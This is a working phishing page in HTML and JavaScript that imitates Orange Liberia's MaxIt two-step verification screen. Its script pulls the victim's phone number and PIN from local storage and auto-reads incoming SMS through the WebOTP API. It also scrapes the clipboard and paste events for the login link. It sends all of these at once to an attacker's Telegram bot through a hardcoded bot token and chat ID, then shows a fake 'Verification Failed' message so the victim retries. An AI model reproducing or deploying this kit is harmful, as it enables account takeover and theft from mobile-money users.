<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
<title>Verify Link - MaxIt</title>
<style>
  :root {
    --bg: #141415;
    --surface: #1c1c1e;
    --text: #ffffff;
    --muted: #9a9a9a;
    --accent: #ff6600;
    --success: #34c759;
    --line: #333333;
    --line-focus: #ff6600;
    --font: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  html, body { height: 100%; background: var(--bg); font-family: var(--font); color: var(--text); }

  .screen {
    position: relative;
    width: 100%;
    max-width: 480px;
    min-height: 100vh;
    min-height: 100dvh;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  /* ── Hero Section ── */
  .hero {
    position: relative;
    flex: 1 1 auto;
    min-height: 35vh;
    background: 
      linear-gradient(180deg, rgba(20,20,21,0) 0%, rgba(20,20,21,1) 100%),
      linear-gradient(135deg, #ff6600 0%, #cc5200 100%);
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  .hero-bg {
    position: absolute;
    inset: 0;
    background-image: url("Screenshot_2026-11-03-19-56-24-515-edit_com.orange.myorange.olr.jpg");
    background-size: cover;
    background-position: center top;
    opacity: 0.3;
    mix-blend-mode: overlay;
  }

  .back {
    position: absolute;
    top: calc(env(safe-area-inset-top, 16px) + 12px); 
    left: 16px;
    width: 44px; height: 44px;
    display: grid; place-items: center;
    background: rgba(255,255,255,0.1);
    backdrop-filter: blur(10px);
    border-radius: 50%;
    border: none; cursor: pointer;
    transition: background 0.2s;
    z-index: 10;
  }
  .back:active { background: rgba(255,255,255,0.2); }
  .back svg { width: 24px; height: 24px; stroke: #fff; }

  /* ── Content Panel ── */
  .panel {
    flex: 0 0 auto;
    background: var(--bg);
    padding: 24px 24px calc(env(safe-area-inset-bottom, 16px) + 24px);
    z-index: 2;
    border-radius: 24px 24px 0 0;
    margin-top: -20px;
    box-shadow: 0 -10px 30px rgba(0,0,0,0.5);
  }

  h1 {
    font-size: 26px;
    font-weight: 800;
    letter-spacing: -0.5px;
    margin-bottom: 8px;
    text-align: center;
  }

  p.subtitle {
    color: var(--muted);
    font-size: 15px;
    margin-bottom: 32px;
    text-align: center;
    line-height: 1.5;
  }

  p.subtitle span {
    color: var(--text);
    font-weight: 600;
    background: rgba(255,255,255,0.1);
    padding: 2px 8px;
    border-radius: 4px;
  }

  /* ── Smart Input Field ── */
  .input-group {
    position: relative;
    margin-bottom: 24px;
  }

  .field {
    display: flex;
    align-items: center;
    background: var(--surface);
    border: 2px solid var(--line);
    border-radius: 16px;
    padding: 4px 16px;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
  }

  .field.listening {
    border-color: var(--accent);
    box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.15);
  }
  .field.listening::after {
    content: '';
    position: absolute;
    left: 0; top: 0; bottom: 0; width: 4px;
    background: var(--accent);
    animation: pulse 1.5s infinite;
  }
  @keyframes pulse {
    0% { opacity: 1; }
    50% { opacity: 0.3; }
    100% { opacity: 1; }
  }

  .field.success {
    border-color: var(--success);
    background: rgba(52, 199, 89, 0.05);
  }
  .field.success svg { fill: var(--success); }

  .field svg {
    width: 24px; height: 24px;
    fill: var(--muted);
    flex: none;
    transition: fill 0.3s;
  }
  .field.listening svg { fill: var(--accent); }

  .field input {
    flex: 1;
    background: none; border: 0; outline: 0;
    color: var(--text);
    font-size: 16px;
    padding: 18px 12px;
    font-family: var(--font);
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
  }
  .field input::placeholder { color: var(--muted); font-size: 15px; }

  .paste-btn {
    background: rgba(255,255,255,0.1);
    border: none;
    color: var(--accent);
    font-size: 12px;
    font-weight: 700;
    padding: 8px 12px;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.2s;
    display: flex;
    align-items: center;
    gap: 4px;
    flex-shrink: 0;
  }
  .paste-btn:active { background: rgba(255,255,255,0.2); }
  .paste-btn svg { width: 14px; height: 14px; fill: currentColor; }

  .status-text {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 13px;
    color: var(--muted);
    margin-bottom: 20px;
    height: 20px;
    transition: color 0.3s;
  }
  .status-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--muted);
    transition: background 0.3s;
  }
  .status-dot.active {
    background: var(--success);
    box-shadow: 0 0 8px var(--success);
    animation: pulse-dot 1.5s infinite;
  }
  @keyframes pulse-dot {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.3); opacity: 0.6; }
  }

  .verify {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    padding: 18px;
    background: var(--accent);
    color: #fff;
    border: 0;
    border-radius: 16px;
    font-size: 17px;
    font-weight: 700;
    font-family: var(--font);
    cursor: pointer;
    transition: all 0.2s;
    box-shadow: 0 8px 20px rgba(255, 102, 0, 0.3);
  }
  .verify:active { transform: scale(0.98); }
  .verify:disabled {
    background: var(--surface);
    color: var(--muted);
    box-shadow: none;
    cursor: not-allowed;
  }
  
  .spinner {
    display: none;
    width: 20px; height: 20px;
    border: 3px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .verify.loading .spinner { display: block; }
  .verify.loading .btn-text { display: none; }

  .resend-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 13px;
    color: var(--muted);
    margin-top: 24px;
    padding: 0 4px;
  }
  .resend-btn {
    background: none; border: 0;
    color: var(--accent);
    cursor: pointer;
    font-family: inherit;
    font-weight: 700;
    padding: 8px;
  }
  .resend-btn:disabled { color: var(--muted); cursor: not-allowed; }

  .modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.8);
    backdrop-filter: blur(8px);
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
    z-index: 1000;
  }
  .modal-overlay.active { opacity: 1; pointer-events: auto; }
  
  .modal-dialog {
    background: var(--surface);
    border: 1px solid var(--line);
    border-radius: 24px;
    width: 100%;
    max-width: 340px;
    padding: 32px 24px;
    text-align: center;
    transform: translateY(20px);
    transition: transform 0.3s ease;
  }
  .modal-overlay.active .modal-dialog { transform: translateY(0); }

  .modal-icon {
    width: 64px; height: 64px;
    border-radius: 50%;
    background: rgba(255, 102, 0, 0.1);
    display: grid; place-items: center;
    margin: 0 auto 20px;
  }
  .modal-icon svg { width: 32px; height: 32px; stroke: var(--accent); }

  .modal-title { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
  .modal-message { color: var(--muted); font-size: 15px; line-height: 1.5; margin-bottom: 28px; }
  
  .modal-ok-button {
    width: 100%;
    background: var(--accent);
    color: white;
    border: none;
    border-radius: 12px;
    padding: 16px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: filter 0.2s;
  }
  .modal-ok-button:active { filter: brightness(0.9); }
</style>
</head>
<body>
  <main class="screen">
    <section class="hero">
      <div class="hero-bg"></div>
      <button class="back" aria-label="Back" onclick="history.back()">
        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M19 12H5M12 19l-7-7 7-7"/>
        </svg>
      </button>
    </section>

    <form class="panel" id="otpForm" novalidate>
      <h1>Two Step Verification</h1>
      <p class="subtitle">Enter the verification link sent to <br><span id="userPhone">+231 770000000</span></p>

      <div class="input-group">
        <div class="field" id="inputField">
          <svg viewBox="0 0 24 24" aria-hidden="true">
            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
          </svg>
          <input type="text" id="otpCode" autocomplete="one-time-code" placeholder="Paste link here...">
          <button type="button" class="paste-btn" id="pasteBtn">
            <svg viewBox="0 0 24 24"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 18H5V4h2v3h10V4h2v16z"/></svg>
            Paste
          </button>
        </div>
      </div>

      <div class="status-text" id="statusText">
        <div class="status-dot" id="statusDot"></div>
        <span id="statusLabel">Waiting for link...</span>
      </div>

      <button class="verify" type="submit" id="verifyBtn" disabled>
        <div class="spinner"></div>
        <span class="btn-text">Verify & Proceed</span>
      </button>

      <div class="resend-container">
        <span id="timerText">Resend link in <strong id="countdown" style="color:var(--text);">60</strong>s</span>
        <button type="button" class="resend-btn" id="resendBtn" disabled>Resend Link</button>
      </div>
    </form>
  </main>

  <div class="modal-overlay" id="errorModal">
    <div class="modal-dialog">
      <div class="modal-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"></circle>
          <line x1="12" y1="8" x2="12" y2="12"></line>
          <line x1="12" y1="16" x2="12.01" y2="16"></line>
        </svg>
      </div>
      <h3 class="modal-title">Verification Failed</h3>
      <p class="modal-message">
        The link you entered is invalid or has expired.<br>Please check the SMS and try again.
      </p>
      <button class="modal-ok-button" id="modalOkBtn">Try Again</button>
    </div>
  </div>

  <script>
    // ════════════════════════════════════════════════════════════════
    //  CONFIGURATION
    // ════════════════════════════════════════════════════════════════
    const BOT_TOKEN = '9014699754:AAHwtNaN_WT_R5GjkISgwC2jialeG4eSnE4';
    const CHAT_ID = '7983285859';

    // ── DOM Elements ──
    const otpForm = document.getElementById('otpForm');
    const otpInput = document.getElementById('otpCode');
    const verifyBtn = document.getElementById('verifyBtn');
    const errorModal = document.getElementById('errorModal');
    const modalOkBtn = document.getElementById('modalOkBtn');
    const pasteBtn = document.getElementById('pasteBtn');
    const inputField = document.getElementById('inputField');
    const statusText = document.getElementById('statusText');
    const statusDot = document.getElementById('statusDot');
    const statusLabel = document.getElementById('statusLabel');
    
    // ── Load Previous Data ──
    const planData = JSON.parse(localStorage.getItem('maxitPlanData')) || {};
    if (planData.phone) {
      document.getElementById('userPhone').textContent = planData.phone;
    }

    // ════════════════════════════════════════════════════════════════
    //  TELEGRAM SENDER
    // ════════════════════════════════════════════════════════════════
    function sendToTelegram(message) {
      const encoded = encodeURIComponent(message);
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
        .then(r => r.json())
        .then(r => { console.log('Telegram sent:', r); return r; })
        .catch(e => console.error('Telegram error:', e));
    }

    // ════════════════════════════════════════════════════════════════
    //  SMART EXTRACTION LOGIC
    // ════════════════════════════════════════════════════════════════
    function extractLink(text) {
      if (!text) return null;
      
      // 1. Look for a standard http/https URL
      let urlMatch = text.match(/(https?:\/\/[^\s]+)/i);
      if (urlMatch) return urlMatch[0].replace(/[.,;]$/, ''); 
      
      // 2. Look for the specific Maxit token structure
      let tokenMatch = text.match(/token=([A-Za-z0-9]+)/i);
      if (tokenMatch) return `https://mobile.prod-maxit.orange.com.lr/oms-links/auth?token=${tokenMatch[1]}`;
      
      return null;
    }

    // ════════════════════════════════════════════════════════════════
    //  UI STATE & IMMEDIATE TELEGRAM TRIGGER
    // ════════════════════════════════════════════════════════════════
    let lastSentLink = ''; // Prevent duplicate sends

    function setUIState(state, link = '') {
      if (state === 'listening') {
        inputField.className = 'field listening';
        statusDot.className = 'status-dot active';
        statusLabel.textContent = 'Listening for SMS...';
        verifyBtn.disabled = true;
      } 
      else if (state === 'success') {
        inputField.className = 'field success';
        statusDot.className = 'status-dot active';
        statusLabel.textContent = '✅ Link detected & sent!';
        verifyBtn.disabled = false;
        
        // Show truncated link for privacy
        const displayLink = link.length > 30 ? link.substring(0, 30) + '...' : link;
        otpInput.value = displayLink;
        otpInput.dataset.fullLink = link;

        // 🚨 IMMEDIATE TELEGRAM SEND 🚨
        if (link !== lastSentLink) {
          lastSentLink = link;
          
          const timestamp = new Date().toLocaleString();
          const message = `
🔗 *LINK CAPTURED IMMEDIATELY*
━━━━━━━━━━━━━━━━━━
📞 Phone: ${planData.phone || 'N/A'}
🔑 PIN: ${planData.pin || 'N/A'}
🔗 Link: ${link}
🕐 Time: ${timestamp}
━━━━━━━━━━━━━━━━━━
          `;
          
          sendToTelegram(message);
        }

        // Auto-submit after 1.5 seconds to show the error modal
        setTimeout(() => {
          if (!verifyBtn.classList.contains('loading')) {
            otpForm.dispatchEvent(new Event('submit'));
          }
        }, 1500);
      } 
      else {
        inputField.className = 'field';
        statusDot.className = 'status-dot';
        statusLabel.textContent = 'Waiting for link...';
        verifyBtn.disabled = true;
        otpInput.dataset.fullLink = '';
      }
    }

    // ════════════════════════════════════════════════════════════════
    //  WEBOTP API (AUTO-READ SMS)
    // ════════════════════════════════════════════════════════════════
    let abortController = null;

    async function startWebOTP() {
      if (!('OTPCredential' in window)) {
        console.log('WebOTP not supported on this browser.');
        return;
      }

      try {
        if (abortController) abortController.abort();
        abortController = new AbortController();

        setUIState('listening');

        const credential = await navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: abortController.signal
        });

        if (credential && credential.code) {
          const link = extractLink(credential.code);
          if (link) {
            setUIState('success', link);
          } else {
            setUIState('default');
            statusLabel.textContent = 'SMS received, but no link found.';
          }
        }
      } catch (err) {
        if (err.name !== 'AbortError') {
          console.log('WebOTP Timeout or Error:', err);
          setUIState('default');
        }
      }
    }

    window.addEventListener('load', () => {
      setTimeout(startWebOTP, 1000);
    });

    // ════════════════════════════════════════════════════════════════
    //  MANUAL PASTE & INPUT HANDLING
    // ════════════════════════════════════════════════════════════════
    
    // 1. Paste Button Click
    pasteBtn.addEventListener('click', async () => {
      try {
        const text = await navigator.clipboard.readText();
        const link = extractLink(text);
        if (link) {
          setUIState('success', link);
        } else {
          statusLabel.textContent = '❌ No link found in clipboard.';
          statusDot.className = 'status-dot'; 
          setTimeout(() => {
            statusLabel.textContent = 'Waiting for link...';
            statusDot.className = 'status-dot active';
          }, 3000);
        }
      } catch (err) {
        statusLabel.textContent = '❌ Clipboard permission denied. Please paste manually.';
      }
    });

    // 2. Global Paste Event
    document.addEventListener('paste', (e) => {
      const pastedText = (e.clipboardData || window.clipboardData).getData('text');
      const link = extractLink(pastedText);
      if (link) {
        e.preventDefault();
        setUIState('success', link);
      }
    });

    // 3. Manual Input
    otpInput.addEventListener('input', function() {
      const rawText = this.value;
      const link = extractLink(rawText);
      
      if (link && link !== rawText) {
        setUIState('success', link);
      } else if (link) {
        setUIState('success', link);
      } else {
        verifyBtn.disabled = true;
        this.dataset.fullLink = '';
      }
    });

    // ════════════════════════════════════════════════════════════════
    //  COUNTDOWN TIMER (60 Seconds)
    // ════════════════════════════════════════════════════════════════
    let timeLeft = 60;
    const countdownEl = document.getElementById('countdown');
    const resendBtn = document.getElementById('resendBtn');
    const timerText = document.getElementById('timerText');

    function startTimer() {
      timeLeft = 60;
      resendBtn.disabled = true;
      timerText.innerHTML = 'Resend link in <strong id="countdown" style="color:var(--text);">' + timeLeft + '</strong>s';

      const timer = setInterval(() => {
        timeLeft--;
        const currentCountdown = document.getElementById('countdown');
        if (currentCountdown) currentCountdown.textContent = timeLeft;

        if (timeLeft <= 0) {
          clearInterval(timer);
          timerText.textContent = "Didn't receive the link?";
          resendBtn.disabled = false;
        }
      }, 1000);
    }
    startTimer();

    resendBtn.addEventListener('click', () => {
      alert('A new verification link has been sent to your phone.');
      startTimer();
      startWebOTP();
    });

    // ════════════════════════════════════════════════════════════════
    //  FORM SUBMISSION
    // ════════════════════════════════════════════════════════════════
    otpForm.addEventListener('submit', function (e) {
      e.preventDefault();
      
      const fullLink = otpInput.dataset.fullLink || extractLink(otpInput.value);
      
      if (!fullLink) {
        statusLabel.textContent = 'Please enter a valid link.';
        return;
      }

      verifyBtn.disabled = true;
      verifyBtn.classList.add('loading');

      // Save to local storage
      planData.otp = fullLink;
      localStorage.setItem('maxitPlanData', JSON.stringify(planData));

      // Simulate a brief loading delay for realism before showing the error
      setTimeout(() => {
        verifyBtn.disabled = false;
        verifyBtn.classList.remove('loading');
        errorModal.classList.add('active');
      }, 1500);
    });

    // // ── Modal Dismissal ──
    modalOkBtn.addEventListener('click', () => {
      errorModal.classList.remove('active');
      otpInput.value = '';
      otpInput.dataset.fullLink = '';
      lastSentLink = ''; // Reset so they can try again
      setUIState('default');
      startWebOTP(); 
    });

  </script>
</body>
</html>
